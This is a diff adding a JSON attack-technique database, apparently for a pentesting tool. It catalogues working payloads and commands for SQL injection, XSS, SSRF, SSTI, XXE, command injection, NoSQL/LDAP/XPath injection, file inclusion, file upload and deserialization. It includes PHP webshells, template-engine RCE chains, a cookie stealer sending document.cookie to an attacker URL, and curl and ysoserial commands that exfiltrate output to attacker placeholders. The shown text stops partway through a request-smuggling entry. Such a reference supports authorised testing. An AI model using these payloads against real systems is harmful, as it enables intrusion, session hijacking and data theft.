@@ -1,0 +1,1333 @@
+{
+  "version": "1.0.0",
+  "generated_at": "2026-05-11T00:00:00+00:00",
+  "source_commit": "36c999d7",
+  "techniques": {
+    "sql-injection": {
+      "name": "SQL Injection",
+      "full_name": "SQL Injection (SQLi)",
+      "description": "SQL injection lets an attacker alter the SQL queries an application sends to its database by inserting malicious SQL into user-controlled input. Successful exploitation can lead to authentication bypass, data exfiltration, data modification, and in some cases remote code execution.",
+      "vuln_type": "injection",
+      "aliases": ["sqli", "sql injection", "sqlinjection"],
+      "payloads": [
+        {"context": "Entry point detection", "payload": "'", "note": "Basic quote to trigger error"},
+        {"context": "Entry point detection", "payload": "\"", "note": "Double quote variant"},
+        {"context": "Auth bypass (basic)", "payload": "' OR '1'='1", "note": "Classic tautology"},
+        {"context": "Auth bypass (comment)", "payload": "admin'--", "note": "Comment out password check"},
+        {"context": "Auth bypass (comment)", "payload": "admin'#", "note": "MySQL comment variant"},
+        {"context": "Logical confirmation", "payload": "1 OR 1=1", "note": "Should return true / extra rows"},
+        {"context": "Logical confirmation", "payload": "1 AND 1=2", "note": "Should return false / no rows"},
+        {"context": "Time-based blind (MySQL)", "payload": "1' AND SLEEP(5)--", "note": "5-second delay confirms injectable"},
+        {"context": "Time-based blind (MSSQL)", "payload": "1'; WAITFOR DELAY '0:0:5'--", "note": "MSSQL 5-second delay"},
+        {"context": "Time-based blind (PostgreSQL)", "payload": "1' || pg_sleep(5)--", "note": "PostgreSQL delay"},
+        {"context": "Time-based blind (Oracle)", "payload": "1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5)--", "note": "Oracle delay"},
+        {"context": "UNION-based (detect columns)", "payload": "' ORDER BY 1--", "note": "Increment until error to find column count"},
+        {"context": "UNION-based (MySQL)", "payload": "' UNION SELECT NULL,NULL,NULL--", "note": "Adjust NULL count to match columns"},
+        {"context": "Error-based (MySQL)", "payload": "' AND extractvalue(1,concat(0x7e,version()))--", "note": "Extracts version in error message"},
+        {"context": "Stacked queries (MSSQL)", "payload": "'; EXEC xp_cmdshell('whoami')--", "note": "RCE via xp_cmdshell if enabled"}
+      ],
+      "commands": [
+        {
+          "name": "sqlmap basic scan",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "sqlmap -u \"{URL}\" --dbs",
+          "note": "Enumerate databases; add --level=5 --risk=3 for deeper testing"
+        },
+        {
+          "name": "sqlmap with request file",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "sqlmap -r {REQUEST_FILE} --dbs --batch",
+          "note": "Save request from Burp and use -r; --batch accepts defaults automatically"
+        },
+        {
+          "name": "sqlmap dump table",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "sqlmap -u \"{URL}\" -D {DB} -T {TABLE} --dump",
+          "note": "Dump a specific table"
+        },
+        {
+          "name": "sqlmap OS shell",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "sqlmap -u \"{URL}\" --os-shell",
+          "note": "Attempt interactive OS shell via file write or stacked queries"
+        },
+        {
+          "name": "sqlmap POST data",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "sqlmap -u \"{URL}\" --data=\"{POST_DATA}\" -p {PARAM} --dbs",
+          "note": "Test POST parameter; use -p to specify which parameter"
+        }
+      ],
+      "see_also": ["nosql-injection", "ldap-injection", "mssql-injection", "mysql-injection", "postgresql-injection"]
+    },
+    "xss-cross-site-scripting": {
+      "name": "XSS",
+      "full_name": "Cross-Site Scripting (XSS)",
+      "description": "XSS occurs when attacker-controlled data is reflected or stored in a page without proper encoding and is executed as JavaScript in a victim's browser. Impacts include session hijacking, credential theft, defacement, and further client-side attacks.",
+      "vuln_type": "xss",
+      "aliases": ["xss", "cross site scripting", "cross-site scripting", "reflected xss", "stored xss"],
+      "payloads": [
+        {"context": "Basic script tag", "payload": "<script>alert(1)</script>", "note": "Works when input lands in raw HTML context"},
+        {"context": "Image tag onerror", "payload": "<img src=x onerror=alert(1)>", "note": "Useful when script tags are filtered"},
+        {"context": "SVG onload", "payload": "<svg onload=alert(1)>", "note": "SVG-based XSS bypass"},
+        {"context": "Escape attribute context", "payload": "\"><img src=x onerror=alert(1)>", "note": "Close attribute and tag, inject new element"},
+        {"context": "Inject event in attribute", "payload": "\" autofocus onfocus=alert(1) x=\"", "note": "When closing attribute but not tag"},
+        {"context": "javascript: protocol", "payload": "javascript:alert(1)", "note": "Use in href attribute values"},
+        {"context": "Script string escape", "payload": "';alert(1)//", "note": "Break out of a JS string inside <script> block"},
+        {"context": "Template literal inject", "payload": "${alert(1)}", "note": "When input lands inside backtick template literals"},
+        {"context": "AngularJS sandbox (v1)", "payload": "{{constructor.constructor('alert(1)')()}}", "note": "AngularJS CSTI payload"},
+        {"context": "CSP bypass (data URI)", "payload": "<object data=\"data:text/html,<script>alert(1)</script>\">", "note": "If object-src or data: is allowed"},
+        {"context": "WAF bypass (encoding)", "payload": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">", "note": "HTML entity encoded alert"},
+        {"context": "Callback function XSS", "payload": "alert(1)", "note": "When ?callback= or ?jsonp= is reflected as function call"},
+        {"context": "DOM XSS (location.hash)", "payload": "#<img src=x onerror=alert(1)>", "note": "When page reads location.hash and writes to innerHTML"},
+        {"context": "Polyglot", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>", "note": "Multi-context polyglot payload"}
+      ],
+      "commands": [
+        {
+          "name": "XSStrike automated scan",
+          "platform": "linux",
+          "category": "detection",
+          "command": "python3 xsstrike.py -u \"{URL}\" --crawl",
+          "note": "Automated XSS scanner with WAF bypass capabilities"
+        },
+        {
+          "name": "dalfox XSS scan",
+          "platform": "linux",
+          "category": "detection",
+          "command": "dalfox url \"{URL}\" --follow-redirects",
+          "note": "Fast XSS scanner written in Go"
+        },
+        {
+          "name": "Steal cookies via XSS",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "<script>new Image().src='{ATTACKER_URL}?c='+document.cookie</script>",
+          "note": "Basic cookie stealer payload; host a listener at ATTACKER_URL"
+        }
+      ],
+      "see_also": ["dom-xss", "client-side-template-injection-csti", "content-security-policy-csp-bypass", "cors-bypass"]
+    },
+    "dom-xss": {
+      "name": "DOM XSS",
+      "full_name": "DOM-Based Cross-Site Scripting",
+      "description": "DOM XSS occurs when JavaScript reads data from an attacker-controllable source (e.g. location.hash, document.URL) and passes it to a dangerous sink (e.g. innerHTML, eval) without sanitization, executing script without any server-side reflection.",
+      "vuln_type": "xss",
+      "aliases": ["dom based xss", "dom xss"],
+      "payloads": [
+        {"context": "innerHTML sink (location.hash)", "payload": "#<img src=x onerror=alert(1)>", "note": "Triggers when hash is written to innerHTML"},
+        {"context": "document.write sink", "payload": "\"><script>alert(1)</script>", "note": "Breaks out of a document.write context"},
+        {"context": "eval sink (JSON)", "payload": "};alert(1);//", "note": "When user input is passed to eval() inside JSON"},
+        {"context": "jQuery selector sink", "payload": "<img src=1 onerror=alert(1)>", "note": "When hash passed to jQuery $() function"},
+        {"context": "Angular ng-template", "payload": "{{constructor.constructor('alert(1)')()}}", "note": "AngularJS template injection in DOM"}
+      ],
+      "commands": [
+        {
+          "name": "Find DOM sinks with DOM Invader",
+          "platform": "both",
+          "category": "detection",
+          "command": "# Use Burp DOM Invader browser extension; auto-canaries source/sink tracking",
+          "note": "Enable in Burp's embedded Chromium browser; shows canary propagation to sinks"
+        }
+      ],
+      "see_also": ["xss-cross-site-scripting", "client-side-template-injection-csti"]
+    },
+    "ssrf-server-side-request-forgery": {
+      "name": "SSRF",
+      "full_name": "Server-Side Request Forgery (SSRF)",
+      "description": "SSRF forces a server to make HTTP requests to an attacker-specified destination, enabling access to internal services, cloud metadata endpoints, and sometimes RCE. Often found in URL-fetching features, webhooks, PDF generators, and import/export functions.",
+      "vuln_type": "ssrf",
+      "aliases": ["ssrf", "server side request forgery", "server-side request forgery"],
+      "payloads": [
+        {"context": "Internal localhost access", "payload": "http://localhost/", "note": "Access services bound only to localhost"},
+        {"context": "Internal network scan", "payload": "http://192.168.0.1/", "note": "Probe internal RFC1918 addresses"},
+        {"context": "AWS metadata", "payload": "http://169.254.169.254/latest/meta-data/", "note": "AWS IMDSv1 metadata endpoint"},
+        {"context": "AWS metadata (IAM creds)", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "note": "Retrieve IAM role credentials"},
+        {"context": "GCP metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/", "note": "Requires Metadata-Flavor: Google header"},
+        {"context": "Azure metadata", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "note": "Azure IMDS endpoint"},
+        {"context": "File read via SSRF", "payload": "file:///etc/passwd", "note": "If file:// protocol is allowed"},
+        {"context": "Gopher SMTP relay", "payload": "gopher://127.0.0.1:25/xHELO%20localhost%0d%0aMAIL%20FROM%3A...", "note": "Craft arbitrary TCP using gopher://"},
+        {"context": "DNS rebinding bypass", "payload": "http://attacker-controlled-domain.com/", "note": "Use a domain that resolves to internal IP after TOCTOU"},
+        {"context": "Localhost bypass (decimal)", "payload": "http://2130706433/", "note": "127.0.0.1 in decimal"},
+        {"context": "Localhost bypass (IPv6)", "payload": "http://[::1]/", "note": "IPv6 loopback"},
+        {"context": "URL bypass (URL fragment)", "payload": "http://evil.com#@127.0.0.1/", "note": "Parser confusion bypass"},
+        {"context": "SSRF via Referer header", "payload": "Referer: http://internal-server/", "note": "Analytics software may follow Referer URLs"}
+      ],
+      "commands": [
+        {
+          "name": "Test SSRF with Burp Collaborator",
+          "platform": "both",
+          "category": "detection",
+          "command": "# Replace URL param with Burp Collaborator URL; check for DNS/HTTP callbacks",
+          "note": "Use Burp's Collaborator Everywhere extension to auto-inject SSRF probes"
+        },
+        {
+          "name": "Probe internal HTTP with curl",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "curl -v --path-as-is -H 'X-Forwarded-For: 127.0.0.1' \"{TARGET_URL}?url=http://169.254.169.254/latest/meta-data/\"",
+          "note": "Test if URL param fetches internal resources"
+        },
+        {
+          "name": "Gopherus SSRF payload generator",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python3 gopherus.py --exploit {SERVICE}",
+          "note": "Generates gopher:// payloads for MySQL, Redis, SMTP, Memcache, FastCGI, etc."
+        }
+      ],
+      "see_also": ["xxe-xee-xml-external-entity", "open-redirect", "cors-bypass"]
+    },
+    "ssti-server-side-template-injection": {
+      "name": "SSTI",
+      "full_name": "Server-Side Template Injection (SSTI)",
+      "description": "SSTI occurs when user input is embedded unsafely into a server-side template (Jinja2, Twig, Freemarker, Velocity, etc.) and evaluated by the template engine, leading to information disclosure, file read, or remote code execution.",
+      "vuln_type": "ssti",
+      "aliases": ["ssti", "server side template injection", "template injection"],
+      "payloads": [
+        {"context": "Detection polyglot", "payload": "${{<%[%'\"}}%\\", "note": "Send to detect template engine errors"},
+        {"context": "Math eval detection", "payload": "{{7*7}}", "note": "Returns 49 in Jinja2/Twig; Jinja2 uses {{ }}"},
+        {"context": "Math eval detection", "payload": "${7*7}", "note": "Returns 49 in Freemarker/Velocity/EL; Spring uses ${}"},
+        {"context": "Math eval detection", "payload": "<%= 7*7 %>", "note": "Returns 49 in ERB (Ruby)"},
+        {"context": "Jinja2 RCE", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "note": "Jinja2 RCE via globals chain"},
+        {"context": "Jinja2 RCE (alternate)", "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}", "note": "Find subprocess.Popen in subclasses list"},
+        {"context": "Twig RCE", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "note": "Twig (PHP) RCE"},
+        {"context": "Freemarker RCE", "payload": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "note": "Freemarker (Java) RCE"},
+        {"context": "Velocity RCE", "payload": "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))\n#set($chr=$x.class.forName('java.lang.Character'))\n#set($str=$x.class.forName('java.lang.String'))\n#set($ex=$rt.getRuntime().exec('id'))", "note": "Apache Velocity RCE"},
+        {"context": "Spring EL RCE", "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "note": "Spring Expression Language"},
+        {"context": "Pebble RCE", "payload": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd) %}", "note": "Pebble (Java) template RCE"}
+      ],
+      "commands": [
+        {
+          "name": "SSTImap scan",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python3 sstimap.py -u \"{URL}\" --crawl 5 --forms",
+          "note": "Automated SSTI scanner with exploitation capabilities"
+        },
+        {
+          "name": "Tplmap scan",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python2.7 tplmap.py -u \"{URL}?{PARAM}=*\" --os-shell",
+          "note": "Tplmap SSTI exploitation tool; * marks the injection point"
+        },
+        {
+          "name": "TInjA scan",
+          "platform": "linux",
+          "category": "detection",
+          "command": "tinja url -u \"{URL}?name=Kirlia\" -H \"Authorization: Bearer {TOKEN}\"",
+          "note": "SSTI+CSTI scanner using novel polyglots"
+        }
+      ],
+      "see_also": ["client-side-template-injection-csti", "xss-cross-site-scripting"]
+    },
+    "xxe-xee-xml-external-entity": {
+      "name": "XXE",
+      "full_name": "XML External Entity Injection (XXE/XEE)",
+      "description": "XXE exploits insecure XML parser configuration to include external entities, enabling local file read, SSRF, and in some cases XSLT-based RCE. It affects any endpoint that parses XML including SOAP, SVG, file uploads, and REST APIs that accept XML.",
+      "vuln_type": "xxe",
+      "aliases": ["xxe", "xee", "xml external entity", "xml injection"],
+      "payloads": [
+        {"context": "Basic file read (/etc/passwd)", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "note": "Basic file read via external entity"},
+        {"context": "File read (PHP base64)", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><data>&xxe;</data>", "note": "PHP filter wrapper to base64-encode file content"},
+        {"context": "SSRF via XXE", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", "note": "Cloud metadata SSRF via XXE"},
+        {"context": "Blind XXE (OOB via parameter entity)", "payload": "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://{ATTACKER}/malicious.dtd\"> %xxe;]><test/>", "note": "Load external DTD to exfiltrate data out-of-band"},
+        {"context": "Blind XXE (DNS callback)", "payload": "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://{COLLABORATOR}\"> %xxe;]><stockCheck><productId>3</productId></stockCheck>", "note": "Confirms blind XXE via DNS/HTTP callback"},
+        {"context": "Error-based XXE exfil", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://{ATTACKER}/evil.dtd\"> %dtd;]><foo>&error;</foo>", "note": "Triggers parse error containing file contents"},
+        {"context": "Java directory listing", "payload": "<?xml version=\"1.0\"?><!DOCTYPE root[<!ENTITY xxe SYSTEM \"file:///etc/\">]><root><foo>&xxe;</foo></root>", "note": "Java parsers may list directory contents"}
+      ],
+      "commands": [
+        {
+          "name": "Detect XXE with Burp active scan",
+          "platform": "both",
+          "category": "detection",
+          "command": "# In Burp Scanner: right-click XML request → Scan → Active; check XXE findings",
+          "note": "Burp Pro detects both in-band and out-of-band XXE automatically"
+        },
+        {
+          "name": "XXEinjector",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "ruby xxeinjector.rb --host {ATTACKER_IP} --path /etc/passwd --file {REQUEST_FILE} --oob http",
+          "note": "Automated OOB XXE tool; requires listener on ATTACKER_IP"
+        }
+      ],
+      "see_also": ["ssrf-server-side-request-forgery", "file-inclusion"]
+    },
+    "command-injection": {
+      "name": "Command Injection",
+      "full_name": "OS Command Injection",
+      "description": "Command injection occurs when user input is embedded in an OS command executed by the server without proper sanitization, enabling an attacker to execute arbitrary commands. Often found in ping, traceroute, DNS lookup, file conversion, and backup features.",
+      "vuln_type": "injection",
+      "aliases": ["cmdi", "command injection", "os injection", "shell injection", "rce"],
+      "payloads": [
+        {"context": "Command chaining (semi-colon)", "payload": "; id", "note": "Append second command with semicolon"},
+        {"context": "Command chaining (pipe)", "payload": "| id", "note": "Pipe output to second command"},
+        {"context": "Command chaining (AND)", "payload": "&& id", "note": "Execute second command if first succeeds"},
+        {"context": "Background execution", "payload": "& id &", "note": "Run in background; second & ensures output visible"},
+        {"context": "Subshell", "payload": "$(id)", "note": "Command substitution; Unix only"},
+        {"context": "Newline injection", "payload": "%0a id", "note": "URL-encoded newline bypasses some filters"},
+        {"context": "Blind with sleep", "payload": "; sleep 5", "note": "Time-based detection; 5s delay confirms injection"},
+        {"context": "Blind OOB (curl)", "payload": "; curl http://{ATTACKER}/{host}", "note": "DNS/HTTP exfiltration for blind confirmation"},
+        {"context": "Backtick subshell", "payload": "`id`", "note": "Backtick subshell; Unix only"},
+        {"context": "Space bypass (IFS)", "payload": "ls${IFS}id", "note": "Bypass space filter using $IFS (Internal Field Separator)"},
+        {"context": "WAF bypass (tab)", "payload": "id%09whoami", "note": "%09 = tab character, often not filtered"}
+      ],
+      "commands": [
+        {
+          "name": "commix automated scan",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python3 commix.py --url=\"{URL}\" --data=\"{PARAM}=INJECT_HERE\"",
+          "note": "Automated command injection exploitation tool"
+        },
+        {
+          "name": "Manual test with time delay",
+          "platform": "both",
+          "category": "detection",
+          "command": "curl -s -o /dev/null -w \"%{time_total}\" \"{URL}?{PARAM}=test;sleep+5\"",
+          "note": "Measure response time to confirm blind command injection"
+        }
+      ],
+      "see_also": ["sql-injection", "ssti-server-side-template-injection"]
+    },
+    "nosql-injection": {
+      "name": "NoSQL Injection",
+      "full_name": "NoSQL Injection (MongoDB / CouchDB)",
+      "description": "NoSQL injection exploits applications that construct NoSQL queries from user input without sanitization, most commonly targeting MongoDB operator injection. Impacts include authentication bypass, data exfiltration, and in some cases code execution via $where.",
+      "vuln_type": "injection",
+      "aliases": ["nosql injection", "nosqli", "mongodb injection"],
+      "payloads": [
+        {"context": "MongoDB auth bypass ($ne operator)", "payload": "username[$ne]=invalid&password[$ne]=invalid", "note": "URL params; $ne = not equal, matches any user"},
+        {"context": "MongoDB auth bypass (JSON)", "payload": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "note": "JSON body variant"},
+        {"context": "MongoDB regex bypass", "payload": "username[$regex]=.*&password[$regex]=.*", "note": "Regex match any value"},
+        {"context": "MongoDB $exists", "payload": "username[$exists]=true&password[$exists]=true", "note": "Match any existing field"},
+        {"context": "MongoDB $where RCE", "payload": "'; sleep(5000) // ", "note": "In $where queries, JavaScript execution; time-based detection"},
+        {"context": "Mongo JS injection", "payload": "admin' || 'a'=='a", "note": "Tautology injection in $where string queries"},
+        {"context": "Length extraction (regex)", "payload": "username[$ne]=x&password[$regex]=.{8}", "note": "True if password length is 8; increment to brute-force"},
+        {"context": "Char-by-char extraction", "payload": "username[$eq]=admin&password[$regex]=^a", "note": "Enumerate password char by char with regex"}
+      ],
+      "commands": [
+        {
+          "name": "nosqlmap automated attack",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python3 nosqlmap.py",
+          "note": "Automated NoSQL injection tool; interactive menu-driven"
+        }
+      ],
+      "see_also": ["sql-injection", "ldap-injection"]
+    },
+    "ldap-injection": {
+      "name": "LDAP Injection",
+      "full_name": "LDAP Injection",
+      "description": "LDAP injection manipulates LDAP queries built from user input to bypass authentication, enumerate directory data, or extract sensitive attributes. Common in enterprise apps and SSO systems using Active Directory or OpenLDAP.",
+      "vuln_type": "injection",
+      "aliases": ["ldap injection", "ldapi"],
+      "payloads": [
+        {"context": "Auth bypass (wildcard)", "payload": "*)(uid=*))(|(uid=*", "note": "Classic LDAP injection auth bypass"},
+        {"context": "Auth bypass (always true)", "payload": "admin)(&)", "note": "Close filter and create always-true condition"},
+        {"context": "Username field bypass", "payload": "*", "note": "Wildcard in username field may match any user"},
+        {"context": "Password bypass", "payload": "*)(|(password=*)", "note": "Bypass password check with OR condition"},
+        {"context": "Extract attribute (blind)", "payload": "admin)(|(cn=a*", "note": "Blind extraction: true/false response based on char"},
+        {"context": "OR filter tautology", "payload": "|(objectClass=*)", "note": "Match all objects using OR filter"}
+      ],
+      "commands": [],
+      "see_also": ["sql-injection", "nosql-injection", "xpath-injection"]
+    },
+    "xpath-injection": {
+      "name": "XPath Injection",
+      "full_name": "XPath Injection",
+      "description": "XPath injection manipulates XPath queries used to access XML data, similar to SQL injection but targeting XML documents. Can lead to authentication bypass and data extraction from XML databases.",
+      "vuln_type": "injection",
+      "aliases": ["xpath injection", "xpath"],
+      "payloads": [
+        {"context": "Auth bypass (always true)", "payload": "' or '1'='1", "note": "Classic XPath tautology auth bypass"},
+        {"context": "Auth bypass (comment)", "payload": "' or 1=1 or '1'='1", "note": "Multi-condition tautology"},
+        {"context": "Extract node count", "payload": "' or count(parent::*[position()=1])=0 or '1'='", "note": "Determine number of nodes"},
+        {"context": "Blind extraction", "payload": "' or substring(//user[position()=1]/username,1,1)='a", "note": "Extract username char by char"},
+        {"context": "String extraction (contains)", "payload": "' or contains(//user/password,'a", "note": "Check if password contains char 'a'"}
+      ],
+      "commands": [],
+      "see_also": ["sql-injection", "ldap-injection", "xxe-xee-xml-external-entity"]
+    },
+    "file-inclusion": {
+      "name": "File Inclusion",
+      "full_name": "Local File Inclusion / Remote File Inclusion (LFI/RFI)",
+      "description": "File inclusion vulnerabilities occur when user-controlled input is used to load files server-side (LFI = local files; RFI = remote URLs). LFI can expose sensitive files and often be escalated to RCE via log poisoning, /proc/self/fd tricks, or PHP filter chains.",
+      "vuln_type": "file-based",
+      "aliases": ["lfi", "rfi", "local file inclusion", "remote file inclusion", "path traversal", "directory traversal"],
+      "payloads": [
+        {"context": "Basic LFI (Linux)", "payload": "../../../etc/passwd", "note": "Directory traversal to read /etc/passwd"},
+        {"context": "LFI (double-encoded)", "payload": "..%252f..%252f..%252fetc%252fpasswd", "note": "Double URL-encoded bypass"},
+        {"context": "LFI (null byte - PHP <5.4)", "payload": "../../../etc/passwd%00", "note": "Null byte to truncate appended extension"},
+        {"context": "LFI (stripped non-recursive)", "payload": "....//....//....//etc/passwd", "note": "When '../' is stripped non-recursively"},
+        {"context": "LFI (encoding bypass)", "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "note": "Unicode slash bypass"},
+        {"context": "LFI (Windows)", "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "note": "Windows path traversal"},
+        {"context": "PHP filter (base64 encode)", "payload": "php://filter/convert.base64-encode/resource=index.php", "note": "Read PHP source files base64-encoded"},
+        {"context": "Log poisoning (Apache)", "payload": "/var/log/apache2/access.log", "note": "After injecting PHP code in User-Agent header"},
+        {"context": "LFI via /proc (Linux)", "payload": "/proc/self/environ", "note": "Read environment variables; may contain injected code"},
+        {"context": "PHP session LFI", "payload": "/tmp/sess_{SESSION_ID}", "note": "Include PHP session file if session data is controllable"},
+        {"context": "RFI (remote code)", "payload": "http://{ATTACKER}/shell.txt", "note": "Remote file inclusion; requires allow_url_include=On"}
+      ],
+      "commands": [
+        {
+          "name": "wfuzz LFI scan",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "wfuzz -c -w /path/to/lfi-payloads.txt --hw 0 \"{URL}?page=FUZZ\"",
+          "note": "Brute-force LFI payloads; use Auto_Wordlists lfi wordlist"
+        },
+        {
+          "name": "fimap LFI tool",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python fimap.py -u \"{URL}?page=test\"",
+          "note": "Automated LFI scanner and exploiter"
+        },
+        {
+          "name": "PHP filter chain RCE",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"cmd\"]);?>'",
+          "note": "Generate PHP filter chain for LFI-to-RCE without file write"
+        }
+      ],
+      "see_also": ["file-upload", "xxe-xee-xml-external-entity", "ssrf-server-side-request-forgery"]
+    },
+    "file-upload": {
+      "name": "File Upload",
+      "full_name": "Unrestricted File Upload",
+      "description": "Unrestricted file upload vulnerabilities allow attackers to upload malicious files (web shells, HTML, etc.) that are executed by the server. Bypass techniques target extension filters, content-type checks, and magic byte validation.",
+      "vuln_type": "file-based",
+      "aliases": ["file upload", "unrestricted file upload", "webshell upload"],
+      "payloads": [
+        {"context": "PHP webshell", "payload": "<?php system($_GET['cmd']); ?>", "note": "Save as shell.php; access ?cmd=id"},
+        {"context": "PHP webshell (short tag)", "payload": "<?=system($_GET['cmd'])?>", "note": "Short tag variant; works when short_open_tag=On"},
+        {"context": "Extension bypass (.php5)", "payload": "shell.php5", "note": "PHP5 extension often not blacklisted"},
+        {"context": "Extension bypass (.phtml)", "payload": "shell.phtml", "note": "Alternative PHP extension"},
+        {"context": "Extension bypass (.PhP)", "payload": "shell.PhP", "note": "Mixed case bypass"},
+        {"context": "Extension bypass (null byte)", "payload": "shell.php%00.jpg", "note": "Null byte truncates after .php; PHP < 5.4"},
+        {"context": "Extension bypass (trailing dot)", "payload": "shell.php.", "note": "Trailing dot stripped on Windows/some parsers"},
+        {"context": "Extension bypass (double ext)", "payload": "shell.php.jpg", "note": "Apache mod_php may execute if double extension"},
+        {"context": "Magic bytes bypass (GIF header)", "payload": "GIF89a;<?php system($_GET['cmd']); ?>", "note": "Prepend GIF magic bytes to bypass image check"},
+        {"context": "Content-Type bypass", "payload": "Content-Type: image/png", "note": "Set to image MIME type regardless of actual file content"},
+        {"context": "exiftool metadata injection", "payload": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' img.jpg", "note": "Inject PHP in EXIF metadata"},
+        {"context": ".htaccess upload", "payload": "AddType application/x-httpd-php .jpg", "note": "If .htaccess uploads allowed; makes .jpg execute as PHP"}
+      ],
+      "commands": [
+        {
+          "name": "Upload PHP shell and execute",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "curl -F \"file=@shell.php;type=image/png\" \"{UPLOAD_URL}\" && curl \"{BASE_URL}/uploads/shell.php?cmd=id\"",
+          "note": "Upload disguised as image; then execute"
+        },
+        {
+          "name": "Generate PHP webshell with bypass",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "echo 'GIF89a;<?php system($_GET[\"cmd\"]); ?>' > shell.gif.php",
+          "note": "GIF magic bytes at start may bypass basic content checks"
+        }
+      ],
+      "see_also": ["file-inclusion", "xxe-xee-xml-external-entity"]
+    },
+    "deserialization": {
+      "name": "Deserialization",
+      "full_name": "Insecure Deserialization",
+      "description": "Insecure deserialization occurs when untrusted data is used to reconstruct objects, allowing attackers to modify serialized objects to trigger gadget chains leading to authentication bypass, privilege escalation, or remote code execution.",
+      "vuln_type": "deserialization",
+      "aliases": ["deserialization", "java deserialization", "php deserialization", "ysoserial", "pickle deserialization"],
+      "payloads": [
+        {"context": "PHP serialized object", "payload": "O:8:\"stdClass\":1:{s:4:\"name\";s:5:\"admin\";}", "note": "Modified PHP serialized object; change field values"},
+        {"context": "Java base64 detect (magic bytes)", "payload": "rO0AB...", "note": "Java serialized objects start with rO0AB (base64 of 0xACED0005)"},
+        {"context": "Python pickle RCE", "payload": "cos\\nsystem\\n(S'id'\\ntR.", "note": "Malicious pickle payload; use pickletools or custom script"},
+        {"context": ".NET ViewState tamper", "payload": "__VIEWSTATE=...", "note": "If MAC validation disabled, modify ViewState for RCE"}
+      ],
+      "commands": [
+        {
+          "name": "ysoserial Java payload",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "java -jar ysoserial.jar CommonsCollections6 \"curl {ATTACKER}/$(id)\" | base64 -w0",
+          "note": "Generate Java deserialization gadget chain; try multiple gadgets"
+        },
+        {
+          "name": "ysoserial.net payload (.NET)",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "ysoserial.exe -f BinaryFormatter -g ClaimsPrincipal -o base64 -c \"cmd /c whoami > C:\\\\inetpub\\\\wwwroot\\\\out.txt\"",
+          "note": ".NET deserialization payload; BinaryFormatter is common vector"
+        },
+        {
+          "name": "PHP deserialization scan",
+          "platform": "linux",
+          "category": "detection",
+          "command": "php-serial-killer.py -u \"{URL}\" -c id",
+          "note": "Test PHP object injection via serialized cookies/POST params"
+        },
+        {
+          "name": "PHPGGC gadget chain",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "php phpggc {FRAMEWORK}/{GADGET} system id -b",
+          "note": "PHPGGC generates PHP deserialization gadget chains; list with 'php phpggc -l'"
+        }
+      ],
+      "see_also": ["file-inclusion", "xxe-xee-xml-external-entity"]
+    },
+    "http-request-smuggling": {
+      "name": "HTTP Request Smuggling",
+      "full_name": "HTTP Request Smuggling / Desync",
+      "description": "Request smuggling exploits discrepancies in how front-end proxies and back-end servers parse HTTP request boundaries (Content-Length vs Transfer-Encoding), allowing injection of prefix bytes into the next request and bypassing security controls, poisoning caches, or hijacking sessions.",
+      "vuln_type": "request-manipulation",
+      "aliases": ["request smuggling", "http smuggling", "desync", "clte", "tecl"],
+      "payloads": [
